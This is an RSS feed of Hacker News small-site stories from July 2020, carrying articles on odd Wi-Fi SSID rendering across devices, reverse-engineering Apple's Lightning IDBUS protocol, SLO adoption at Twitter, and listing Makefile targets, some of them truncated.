<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 50]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 50. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sat, 04 Jul 2020 04:16:20 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-50.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sat, 04 Jul 2020 04:16:20 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Comparing how different devices display the SSID “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 24 (<a href="https://news.ycombinator.com/item?id=23708056">thread link</a>) | @herohamp
<br/>
July 1, 2020 | https://hamptonmoore.com/posts/weird-wifi-name-display/ | <a href="https://web.archive.org/web/*/https://hamptonmoore.com/posts/weird-wifi-name-display/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>After my recent post <a href="https://hamptonmoore.com/posts/fios-home-router-emoji/">Setting the SSID of a Fios Home Router to an emoji</a> I decided to set my WiFis SSID to “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”. That name is <a href="https://mothereff.in/byte-counter#a%CC%B6%CC%81%CC%93%CC%BF%CC%88%CC%9B%CC%9B%CD%90%CD%98%CD%86%CC%90%CD%9D%CC%87%CC%92%CC%91%CD%84aaa">36 octets</a> making it over the 32 octets maxium specified in the 2012 standard of 802.11 Section 6.3.11.2.2. My router just cut the name down to 32 octets though to stay complient. This was what was being sent according to <code>iw</code> <code>a\xcc\xb6\xcc\x81\xcc\x93\xcc\xbf\xcc\x88\xcc\x9b\xcc\x9b\xcd\x90\xcd\x98\xcd\x86\xcc\x90\xcd\x9d\xcc\x87\xcc\x92\xcc\x91\xcd</code> with the raw hex being <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc91cd</code>.</p> <p>I decided to see how this showed up on different devices and got some pretty strange results. Below are the devices tested sorted rougly to how they acted.</p> <p>Galaxy S8 running Android 9 with Kernel 4.4.153 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/android.jpg" alt=""></p> <p>Amazon Firestick <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/firestick.jpg" alt=""></p> <p>Both the s8 and the Firestick are rendering the result in what I deem as the correct way with it showing the name just with some of the vertical characters cutoff.</p> <p>iPhone running iOS 13.5.1 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/iphone-ios1351.jpg" alt=""></p> <p>Apple TV Second Generation <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/appletvgen2.jpg" alt=""></p> <p>Next comes the iPhone and Apple TV. At first I had no idea what they were rending these characters as. At first I thought it was just extended ascii but that third character, ∂, was not in extended ASCII. After asking around on the Apple discord server someone said it might be using the <a href="https://en.wikipedia.org/wiki/Mac_OS_Roman">Mac OS Roman</a> character set. It turns out it which is strange because iOS used UTF-8 internally and not Mac OS Roman as that was phased out with the release of Mac OS X.</p> <p>Speaking of Apple devices, there will not be any photos of MacOS though not from a lack of trying. I could not get either of my Macbook to acknowledge that this WiFi network existed. Neither the Wifi dropdown nor the airport commandline utility would show it.</p> <p>Windows 10 Pro 10.0.19041 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/windows10.png" alt=""></p> <p><del>Windows 10 is rendering it using what I believe to be the UTF-8 characters of each octet. This matches what the raw hex of the wifi name would become if you split it up into 8bit bytes and used that as UTF-8 chars.</del> It was pointed out by <a href="https://twitter.com/theFerdi265">@theFerdi265</a> that this is not the first set of UTF-8 chars like I thought. Instead it is <a href="https://en.wikipedia.org/wiki/Windows-1252">Windows-1252</a>, a single-byte character encoding of the Latin alphabet, used by default in the legacy components of Microsoft Windows for English and some other European languages.</p> <p>Chromebook running ChromeOS 83.0.4103.97 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/chromeos.jpg" alt=""></p> <p>ChromeOS is just freaking out not knowing how to render any of the charaters besides the singular a.</p> <p>Kindle Paperwhite running Firmware 5.10.2 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/kindlepaperwhite.jpg" alt=""></p> <p>Vizio M55-C2 TV <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/viziom55-c2.jpg" alt=""></p> <p>Both the Kindle and Vizio TV are showing what <code>iw</code> returned with the a and then escaped hexademical characters.</p> <p>I have no published a follow up to this post, <a href="https://hamptonmoore.com/posts/weird-wifi-names-cont/">here</a>.</p> <p>Discuss this post on Hacker News <a href="https://news.ycombinator.com/item?id=23708056">here</a></p> <hr> <p> Hello reader. I do not normally like to put advertisements or promotions on my website, but recently a good friend of my Jaden Ann Scrivener died in a car crash. She was known in the community as the most caring and energetic person around. She was a beam of sunshine and happiness brightening up the day of anyone who interacted with her. If you could <a href="https://www.aplos.com/aws/give/RayofHopeMedicalMissionsInc/Jaden">please donate to her memorial fund</a>. All the proceeds will go to the <a href="https://www.rohmm.org/">Ray of Hope Medical Missions</a> which facilitates life-changing surgeries, reduces infant mortality, and provides mission opportunities locally. </p> </article></div>]]>
            </description>
            <link>https://hamptonmoore.com/posts/weird-wifi-name-display/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23708056</guid>
            <pubDate>Wed, 01 Jul 2020 23:26:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple Lightning]]>
            </title>
            <description>
<![CDATA[
Score 499 | Comments 199 (<a href="https://news.ycombinator.com/item?id=23705546">thread link</a>) | @captn3m0
<br/>
July 1, 2020 | https://nyansatan.github.io/lightning/ | <a href="https://web.archive.org/web/*/https://nyansatan.github.io/lightning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

                
                <p>Created on 1.7.20</p>

                <p>
                    Here's my little article about (almost) everything I know about Apple Lightning and related technologies: <b>Tristar</b>, <b>Hydra</b>, <b>HiFive</b>, <b>SDQ</b>, <b>IDBUS</b> and etc. But first a tiny warning...
                </p>

                <p><i>
                        Read this article on your own <b>risk</b>! The information in this artcile is based on a lot of AppleInternal materials (leaked datasheets, schematics, source codes) I read in a diagonal direction. And of course on my own research too. I have to warn you, the reader, that I have never done such a research before. Thus, this write-up might use incorrect or just weird terms and turn out partially or completely <b>wrong</b>! 
                    </i>
                </p>

                <p>
                    Before going <i>deeper</i>, let's briefly sort out the terms:
                </p>

                <div>
                    <h2>What's Lightning?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_port_pinout.jpg"><br>

                    <b>Lightning</b> - is a digital interface used in most of the Apple's iOS devices since late 2012. Replaced the old 30-pin connector</p><p>

                    

                    You can see the female port pinout on the picture above and the connector pinout on the picture below:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/lightning_connector_pinout.jpg"><br>

                    Please pay attention to the fact that in the connector, pins on both sides of connector aren't wired in exact same order. Thus, a host device have to detect orientation of a cable before doing anything else</p><p>
                    
                    

                    Though it's not always applicable. Many Lightning accessories I've played with have mirrored pinouts in their connectors
                </p></div>

                <div>
                    <h2>What're Tristar and Hydra?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/tristar_logo.png"><br>

                    <b>Tristar</b> - is the integrated circuit embedded in every device shipped with Lightning female port. Basically, it's a MUX:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/tristar_schematic.png">

                    Among many other things, its main purpose is to communicate with Lightning male connector once one was connected - detect orientation and detect <b>Accessory ID</b> and route internal interfaces like USB, UART and SWD accordingly</p><p>

                    

                    <b>Hydra</b> - is the new variant of Tristar used since iPhone 8/X. The most significant change appears to be a support of wireless charging, but that's to be verified:<br>
                    
                    <img src="https://nyansatan.github.io/lightning/resources/hydra_schematic.png"><br>

                    There're 5 major Tristar/Hydra variants known to me:</p><ul>
                        <li><b>TI THS7383</b> - first-gen Tristar used in iPad mini 1 and iPad 4</li>
                        <li><b>NXP CBTL1608A1</b> - first-gen Tristar used in iPhone 5 and iPod touch 5</li>
                        <li><b>NXP CBTL1609A1</b> - mysterious first-gen Tristar used in iPod nano 7 - <a target="_blank" href="https://www.ifixit.com/Teardown/iPod+Nano+7th+Generation+Teardown/10826#s38931">source</a></li>
                        <li><b>NXP CBTL1610Ax</b> - second-gen Tristar used since iPhone 5C/5S and apparently everything else that doesn't support wireless charging. There're multiple generations of this one (<b>x</b> - number of generation)</li>
                        <li><b>NXP CBTL1612Ax</b> - Hydra used since iPhone 8/X and apparently everything else that supports wireless charging (<b>x</b> - number of generation)</li>
                    </ul><p>

                    From now on, I'll only use the term <b>Tristar</b>, but keep in mind that it will also mean <b>Hydra</b> as well, as they are very similar in the most of aspects that are gonna be covered in this text
                </p></div>

                <div>
                    <h2>What's HiFive?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_connector.svg"><br>

                    <b>HiFive</b> - is Lightning slave, i.e. a male connector. It contains a logical element as well - that chip is known as <b>SN2025</b>/<b>BQ2025</b>
                </p></div>

                <div>
                    <h2>What're SDQ and IDBUS?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/idbus_little.png"><br>

                    These 2 terms are often referred as kind of synonyms. For convinience, I'll only use term <b>IDBUS</b> from now on, as it seems more correct to me (and that's how this technology called in the THS7383 datasheet)</p><p>

                    

                    So, <b>IDBUS</b> - is a digital protocol used for negotiations between Tristar and HiFive. Very similar to <a target="_blank" href="https://en.wikipedia.org/wiki/1-Wire">Onewire protocol</a></p></div>

                <div>
                    <h2>Now we can play</h2><p>

                    Let's sniff the negotiations between Tristar and HiFive. Take a logic analyzer, a Lightning male-to-female passthrough breakout board, some accessory (normal Lightning to USB cable would fit just fine) and of course some device with Lightning port</p><p>

                    

                    First connect logic analyzer's channels to both <b>ID</b> lines of the breakout (pins 4 and 8) and connect the breakout to the device, but do not connect the accessory just yet:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_1.jpg"><br>

                    Right after that start sampling (any rate from 2 MHz and up should be fine). You'll see something like this:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/id_lines_activity.png"><br>

                    As you can see, Tristar polls each ID line by rotation - one after another. But since we didn't connect any accessory, the polling obviously fails. At some point the device will grow tired of this endless stream of failures and stop it. Meanwhile let's examine what exactly happens while polling:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/polling_explained_1.png"><br>

                    First, we can see a long interval (~1.1 milliseconds) when the level is just high and nothing else is happening:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/charge.png"><br>

                    Apparently that time is used to charge internal HiFive's capacitor - the energy from it will be then used to power-up its internal logic chips</p><p>

                    

                    What happens next is far more interesting:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful.png"><br>

                    Obviously, that's some data flowing. But how to interpret it? How to decode it? Let's virtually split it to almost the least least significant parts - to something that I call <b>words</b>:

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful_splitted.png"><br>

                    So basically a <b>word</b> is a combination of <b>fall</b>-<b>rise</b>-<b>fall</b>:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/word_splitted.png"></p><ul>
                        <li><span>Meaningful Stage</span> - time interval taken by this stage defines meaning of a word</li>
                        <li><span>Recovery Stage</span> - time interval which is apparently required for processing the <span>Meaningful Stage</span> on recieving side and/or preparing the next word on sending stage</li>
                    </ul><p>

                    Here is a table of known word types with their time intervals for both stages we discussed above (all units are in microseconds):</p><table>
                        <tbody><tr>
                            <th></th>
                            <th colspan="3">Meaningful</th>
                            <th colspan="2">Recovery</th>
                        </tr>
                        <tr>
                            <th>Word</th>
                            <th>Min</th>
                            <th>Typ</th>
                            <th>Max</th>
                            <th>Min</th>
                            <th>Typ</th>
                        </tr>
                        <tr>
                            <td><b>BREAK</b></td>
                            <td>12</td>
                            <td>14</td>
                            <td>16</td>
                            <td>2.5</td>
                            <td>4.5</td>
                        </tr>
                        <tr>
                            <td><b>WAKE</b></td>
                            <td>22</td>
                            <td>24</td>
                            <td>27</td>
                            <td></td>
                            <td>1100?</td>
                        </tr>
                        <tr>
                            <td><b>ZERO</b></td>
                            <td>6</td>
                            <td>7</td>
                            <td>8</td>
                            <td></td>
                            <td>3</td>
                        </tr>
                        <tr>
                            <td><b>ONE</b></td>
                            <td>1</td>
                            <td>1.7</td>
                            <td>2.5</td>
                            <td></td>
                            <td>8.5</td>
                        </tr>
                        <tr>
                            <td><b>ZERO with STOP*</b></td>
                            <td>6</td>
                            <td>7</td>
                            <td>8</td>
                            <td></td>
                            <td>16</td>
                        </tr>
                        <tr>
                            <td><b>ONE with STOP*</b></td>
                            <td>1</td>
                            <td>1.7</td>
                            <td>2.5</td>
                            <td></td>
                            <td>21</td>
                        </tr>
                    </tbody></table>

                    <p>

                    * - <b>STOP</b> is used when it's a last bit in a byte</p><p>

                    

                    Using the above table we can now build a simple decoder of the protocol:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/decoded.png"><br>

                    As you can see, the first word a host sends is <b>BREAK</b> - when Tristar wants to send a new request, it always starts with it. Then comes a data stage. Please pay attention to the fact that last (8th) bit of a byte has longer <span>Recovery Stage</span>. When a data stage is over, a host sends another <b>BREAK</b>. Then a slave must send a reply (after at least a 2.5 us delay - see the table). Tristar will wait for around 2.2 ms for a reply. If it's not issued in this time interval, Tristar will try to poll another ID line</p><p>

                    

                    Now let's examine the data stage on the example above - <span>0x74 0x00 0x02 0x1f</span>:

                    </p><ul>
                        <li><span>0x74</span> - request/response type. Always even for request, always odd for response (request type + 1)</li>
                        <li><span>0x00 0x02</span> - actual data. Can be empty</li>
                        <li><span>0x1f</span> - CRC8 of both the request type byte and the whole data (polynomial - 0x31, initial value - 0xff)</li>
                    </ul><p>

                    Let's connect some accessory to our setup and see what happens. I'll use Apple's original Lightning to USB cable:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_2.jpg"><br>

                    And here is what appears on IDBUS after a 0x74 request:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x75.png"><br>

                    HiFive replied! And if you scroll further you'll see a lot of other request/response pairs:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x79.png"><br>

                    Some requests do not need a response though:

                    <img src="https://nyansatan.github.io/lightning/resources/request_0x84.png"><br>
                </p></div>

                <div>
                    <h2>Interpreting IDBUS requests and responses</h2><p>

                    The most important IDBUS request is <b>0x74</b> - it is used for two purposes: to tell HiFive enable full current (in case that's supported by an accessory) and to ask it about pin configuration the cable supports and some other metadata</p><p>

                    

                    Not too much is known about how response 0x75's data is encoded. But some bits were available in a certain old Tristar datasheet:</p><table>
                        <caption>First byte of 0x75 response data</caption>
                        <tbody><tr>
                            <th>7</th>
                            <th>6</th>
                            <th>5</th>
                            <th>4</th>
                            <th>3</th>
                            <th>2</th>
                            <th>1</th>
                            <th>0</th>
                        </tr>
                        <tr>
                            <td colspan="2">ACCx</td>
                            <td colspan="2">Dx</td>
                            <td colspan="4">DATA[43:40]</td>
                        </tr>
                    </tbody></table>

                    <br>

                    <div>
                        <table>
                            <caption>ACCx configuration when ID is found on ID0</caption>
                            <tbody><tr>
                                <th>ACCx[1:0]</th>
                                <th>ACC1</th>
                                <th>ACC2</th>
                                <th>HOST_RESET</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z (IDBUS)</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>UART1_RX</td>
                                <td>UART1_TX</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>JTAG_DIO</td>
                                <td>JTAG_CLK</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>HIGH</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>ACCx configuration when ID is found on ID1</caption>
                            <tbody><tr>
                                <th>ACCx[1:0]</th>
                                <th>ACC1</th>
                                <th>ACC2</th>
                                <th>HOST_RESET</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z (IDBUS)</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>UART1_RX</td>
                                <td>UART1_TX</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>JTAG_DIO</td>
                                <td>JTAG_CLK</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>HIGH</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>Dx configuration when ID is found on ID0</caption>
                            <tbody><tr>
                                <th>Dx[1:0]</th>
                                <th>DP1</th>
                                <th>DN1</th>
                                <th>DP2</th>
                                <th>DN2</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>UART1_TX</td>
                                <td>UART1_RX</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>Dx configuration when ID is found on ID1</caption>
                            <tbody><tr>
                                <th>Dx[1:0]</th>
                                <th>DP1</th>
                                <th>DN1</th>
                                <th>DP2</th>
                                <th>DN2</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>UART1_TX</td>
                                <td>UART1_RX</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                        </tbody></table>
                    </div>
                    <p>

                    Using the tables above let's decode our cable's ID (<span>10 0C 00 00 00 00</span>) with keeping in mind that ID line was found on ID0 pin:<br>

                    h
                    </p><table>
                        <caption>First byte of the cable's 0x75 response data</caption>
                        <tbody><tr>
                            <th>7</th>
                            <th>6</th>
                            <th>5</th>
                            <th>4</th>
                            <th>3</th>
                            <th>2</th>
                            <th>1</th>
                            <th>0</th>
                        </tr>
                        <tr>
                            <td colspan="2">ACCx</td>
                            <td colspan="2">Dx</td>
                            <td colspan="4">DATA[43:40]</td>
                        </tr>
                        <tr>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                            <td>1</td>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                        </tr></tbody></table>
    
                    <p>

                    So, ACCx is <span>00</span> meaning that ID0 pin will just stick with IDBUS, and Dx is <span>01</span> meaning that DP1/DN1 pins will be configured as USB0_DP/USB0_DN. Just …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nyansatan.github.io/lightning/">https://nyansatan.github.io/lightning/</a></em></p>]]>
            </description>
            <link>https://nyansatan.github.io/lightning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23705546</guid>
            <pubDate>Wed, 01 Jul 2020 19:37:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SLO Adoption at Twitter]]>
            </title>
            <description>
<![CDATA[
Score 72 | Comments 4 (<a href="https://news.ycombinator.com/item?id=23702876">thread link</a>) | @hannahblameless
<br/>
July 1, 2020 | https://www.blameless.com/blog/slo-adoption-twitter | <a href="https://web.archive.org/web/*/https://www.blameless.com/blog/slo-adoption-twitter">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><br><em>This is the second article of a two-part series. Click </em><a href="http://www.blameless.com/blog/twitters-reliability-journey"><em>here</em></a><em> for part 1 of the interview with Brian, Carrie, JP, and Zac to learn more about </em><a href="https://www.blameless.com/blog/twitters-reliability-journey"><em>Twitter’s SRE journey</em></a><em>.</em><br></p><p><a href="https://www.blameless.com/blog/twitters-reliability-journey">Previously</a>, we saw how SRE at Twitter has transformed their engineering practice to drive production readiness at scale. The concept of service level objectives (SLOs) and error budgets have been key to this transformation, as SLOs shape an organization’s ability to make data-oriented decisions around reliability. (Read <a href="https://www.blameless.com/how-slos-transformed-evernote/">here</a> for a definition of SLOs and how they transformed Evernote). Today, the Twitter team has invested in centralized tooling to measure, track, and visualize SLOs and their corresponding error budgets.&nbsp;<br></p><p>However, successfully implementing SLOs is far easier said than done. Many organizations have struggled with adoption for a number of reasons. Common obstacles include getting stakeholder buy-in, not knowing what (and how) to measure, and confusion over how to make SLOs actionable.&nbsp;&nbsp;<br></p><p>While the Twitter engineering team had laid a very strong foundation around observability and reliability, it took several important breakthroughs before SLOs began achieving broader adoption within the organization and the journey continues.<br></p><h3>The foundations for SLO</h3><p>Prior to SLOs, the engineers had used service level indicators (SLIs) for many years.&nbsp; The SLIs drew from Twitter’s extensive instrumentation of infrastructure and investments in their observability stack. Their observability stack provided a foundation for measuring service health with indicators such as success rate, latency, and throughput across their distributed service ecosystem. For example, the team would monitor the success rate for user-facing HTTP services, which they computed by looking at HTTP 500 errors versus total requests.&nbsp;<br></p><p>Integrating the SLIs with alerts and on-call rotations had been a core practice within their engineering teams for years.&nbsp; Additionally, their focus on incident management and postmortems has enabled them to continuously learn from their always evolving production ecosystem.<br></p><p>A significant inflection point came with embedding the concept of SLO within <a href="https://twitter.github.io/finagle/">Finagle</a>, Twitter’s RPC library, which is maintained by the Core Systems Libraries (CSL) team. As mentioned in the previous post, Finagle delivers reliability features such as load balancing, circuit breakers, failure detectors, and more, filling them inside every single piece of software that runs. In 2018, the CSL team made SLOs a first-class entity in the Twitter internal version of Finagle, creating a foundational API building block that is tied to a service boundary, which they call an objective. This was transformative in that it allowed the team to begin defining service-to-service interactions and modeling beyond just an alert, creating a programmatic definition that the team could now use to inform runtime decisions.&nbsp;<br></p><p>The Twitter team supported the implementation with proposals for projects and use cases that could use the SLO feature, and initially delivered the configuration as well as realtime per-instance measurement of SLOs.&nbsp;&nbsp;<br></p><p>In its initial phases, adoption of the feature was limited. Service owners could configure SLOs, but due to a lack of tooling and benefits automatically associated with turning SLOs on, there was little incentive to do so in context of other priorities.<br></p><p>Seeing this, the team invested in follow-up work. They began to build integrations and solutions for service owners on top of SLOs, such as load-shedding based on SLOs as they provided more useful context than a related metric like CPU throttling. Through piloting such enhancements, the appetite for adoption began to increase.&nbsp;<br></p><h3>Defining SLOs</h3><p>In thinking about how to define SLOs, the Twitter team typically begins by considering which features are key, and ensuring that they're well instrumented and understood.<br></p><p>It’s important to identify the signals that best reflect a critical user experience. Some signals for service success rate can provide color but are not so straightforward to interpret. For example, in analyzing the service error rate inside the data center, the client might retry those requests, making it a faulty datapoint to reason around what the true user success rate is.<br></p><p>Once the team sets a reasonable SLO at the top level, that will drive down through the services that a boundary depends on. Every service has a multitude of service dependencies, and thus the latency and success SLOs for all upstream and downstream services must all work together in context of the defined boundary. SLOs enable a more holistic way of measuring the whole call path.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 	</p><h3>A major turning point: tying SLOs to error budgets</h3><p>The introduction of error budgets marked another critical inflection point in Twitter’s adoption of SLOs. Error budgets make SLOs actionable and provide a different lens to understand a service over time, so they were an important follow-on feature after the original delivery of SLOs.&nbsp;<br></p><p>Error budgets look at the SLO over time, and thus have allowed the team to begin tracking performance by providing a historical view into how the service met objectives through different timeframes. The traditional metric view tends to be shortsighted, and can bury signals around valuable trends and opportunities. Instead of a dashboard that charts hundreds of metrics, error budgets become a forcing function to pick a few of the most important metrics, and get deeper into how and why they change over time.&nbsp;<br></p><p>An important note is that the team does not prescribe a fixed set of actions upon the exhaustion of the error budget. While error budgets can be a powerful tool, the true value has to resonate with engineering and product teams.&nbsp;<br></p><p>With the notion of “<a href="https://www.linkedin.com/pulse/netflixs-context-control-how-does-work-steve-urban/">context, not control</a>” (coined by Netflix), there is strong emphasis on empowering well-intentioned, capable teammates with visualizations and insights to allow them to make better decisions. In the same way, Twitter SREs apply ongoing experimentation to understand what other team members will view as valuable to measure. They understand that error budgets are more about giving team members good tools and context; there is no one policy fits all.&nbsp;&nbsp;<br></p><p>For example, one team hypothesized that the error budget would help inform when automated deploys could proceed, and specifically, whether to pause a deploy if the error budget was exhausted.&nbsp; But what they found was that sometimes the deploy being paused or blocked could contain the fix for the increased errors. Thus, that simple rule of “block deploys if no error budget remains” quickly began to fall apart. The very deploy getting blocked could decrease the volume or rate of errors, and possibly even defend the SLO and enable it to be met over its remaining duration of time.&nbsp;<br></p><p>Bearing in mind that they aren’t necessarily meant to be prescriptive, error budgets provide very useful suggestions for service owners in thinking about how to prioritize work. They create an important ‘runway’ for scaling the pace of innovation up or down. For example, overly rapid error budget burndown could be a sign to prioritize mitigation work for the current on-call or an upcoming sprint. Alternatively, not using enough of the error budget could nudge the team to iterate on feature work faster, or experiment more.&nbsp;</p><h3>The benefits of SLO</h3><p>While the team is still early in its adoption of SLOs, they’ve already seen the immense potential and value of SLOs in several ways.&nbsp;<br></p><p><strong><em>From a ‘distributed service zoo’ to a shared language</em></strong></p><p>Twitter has hundreds, if not thousands, of services, making its infrastructure a complex beast to understand. The current members of the Twitter Command Center (TCC) have been around long enough where they generally know what most of the services are and how services ‘snap together’. However, they know that eventually they will reach a point where that becomes impossible, where no one individual can grok how it all works. By investing in SLOs now to help guide discussions, the goal is that by the time they reach that point of un-knowable complexity, they will have set themselves up to manage service metrics programmatically.<br></p><p><strong><em>The right amount of context</em></strong></p><p>Context is the key. Dashboards can easily have hundreds of charts which translate into thousands of metrics. Teams might have tens or hundreds of alerts on their services across multiple data centers. These dashboards, metrics, and alerts are helpful for those running those services, but they're very high context, and information overload for anyone else.&nbsp;<br></p><p>SLOs create the ability to have more directed conversations with shared context. Instead of looking at a hundred pictures of a dashboard, the team can align on the four or five things that matter. lf any of those are not green, others can understand that something's not right without having to know anything else about the service.<br></p><p><strong><em>Dynamic load balancing and load shedding</em></strong></p><p>By making SLOs a first class entity, services can speak it at the programming level, beyond just measuring it. This enables the team to make systematic improvements using SLOs as a building block. For example, the team is exploring whether back pressure in Finagle can instead be SLO-based.<br></p><p>With Finagle, services can programmatically detect when they are under load (typically with second class signals such as CPU), and then signal to redirect traffic to another instance. Instead of relying on second class signals to implement back pressure, a service can directly know if it’s trending towards an SLO violation in order to signal back pressure and reduce load on itself.<br></p><p><strong><em>Graceful degradation</em></strong></p><p>One of the Twitter team’s goals for SLO is in gracefully degrading services during large-scale events to ensure that core functionality is always available. Rather than an all-or-nothing failure mode, the team aims to gracefully degrade services by stripping away peripheral features while maintaining core functionality.<br></p><p>The Twitter team is interested in utilizing SLOs to implement a selective circuit breaker pattern to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.blameless.com/blog/slo-adoption-twitter">https://www.blameless.com/blog/slo-adoption-twitter</a></em></p>]]>
            </description>
            <link>https://www.blameless.com/blog/slo-adoption-twitter</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702876</guid>
            <pubDate>Wed, 01 Jul 2020 15:55:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to list all the targets on a Makefile]]>
            </title>
            <description>
<![CDATA[
Score 129 | Comments 54 (<a href="https://news.ycombinator.com/item?id=23702756">thread link</a>) | @diamantidis_io
<br/>
July 1, 2020 | https://diamantidis.github.io/tips/2020/07/01/list-makefile-targets | <a href="https://web.archive.org/web/*/https://diamantidis.github.io/tips/2020/07/01/list-makefile-targets">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><code>make</code> is great tool to orchestrate the setup and build process of a project. It expects a <code>Makefile</code>, where we define targets to execute, like for example <code>install</code> and <code>run</code>. Then we can use <code>make install</code> and <code>make run</code> to execute those tasks.</p> <p>While target names like <code>install</code> are quite common, the problems arise when we have to deal with a lengthy <code>Makefile</code>, and we are not aware of all the available targets.</p> <p>Hopefully, with a slight modification of our current <code>Makefile</code> and the addition of a new target, we can expose this information and access it from the Terminal app. Let’s see how!</p> <p>First, we will have to document each of the existing targets. To do so, we will add a comment starting with <code>##</code> right after the target’s name.</p> <div><div><pre><code><span>install</span>: <span>## Install </span>
	@echo <span>"Installing..."</span>

run: <span>## Run</span>
	@echo <span>"Running..."</span>
